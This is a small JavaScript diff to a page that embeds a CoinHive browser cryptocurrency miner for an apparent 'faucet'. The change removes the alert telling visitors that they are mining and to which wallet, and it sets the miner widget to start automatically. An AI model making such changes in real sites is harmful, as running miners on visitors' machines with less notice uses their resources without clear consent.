@@ -60,7 +60,6 @@ function startUserMiner() {
     var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress);
     anonMiner.stop();
 
-    alert('You are now mining to: "' + userWalletAddress + '" Please leave this page open, the faucet will be dripping. You can close this Alert');
     document.getElementById('minerButton').innerHTML = 'Mining to: ' + userWalletAddress;
 
     var button = document.getElementById('minerButton');
@@ -72,7 +71,7 @@ function startUserMiner() {
     createAttribute('class', 'coinhive-miner', div);
     createAttribute('data-key', 'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', div);
     createAttribute('data-user', userWalletAddress, div);
-    createAttribute('data-autostart', 'false', div);
+    createAttribute('data-autostart', 'true', div);
     createAttribute('data-whitelabel', 'false', div);
     createAttribute('data-background', '#FFFFFF', div);
     createAttribute('data-text', '#4C4C4C', div);
